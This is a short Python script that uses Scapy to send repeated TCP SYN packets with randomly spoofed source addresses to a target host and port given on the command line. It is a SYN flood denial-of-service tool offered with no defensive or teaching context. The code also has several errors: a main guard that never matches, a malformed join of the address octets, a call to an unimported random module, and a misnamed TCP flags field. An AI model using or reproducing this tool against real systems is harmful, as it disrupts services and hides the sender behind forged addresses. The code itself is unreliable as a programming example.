import sys
from scapy.all import *
from random import randint

if __name__ == "main":
  # Store arguments in variables
  dest_addr = str(sys.argv[1])
  dest_port = int(sys.argv[2])
  nr_connect = int(sys.argv[3])
  
  for i in range(nr_connect):
    src_ip = ".".join(str(random.randint(0,255)), str(random.randint(0,255)), str(random.randint(0,255)), str(random.randint(0,255)))
    seq = randint(1024, 9000)
    ip = IP(src=src_ip, dst=dest_addr)
    tcp = TCP(sport=RandShort(), dport=dest_port, seq=seq, flag="S")
    send(ip/tcp, verbose=0)
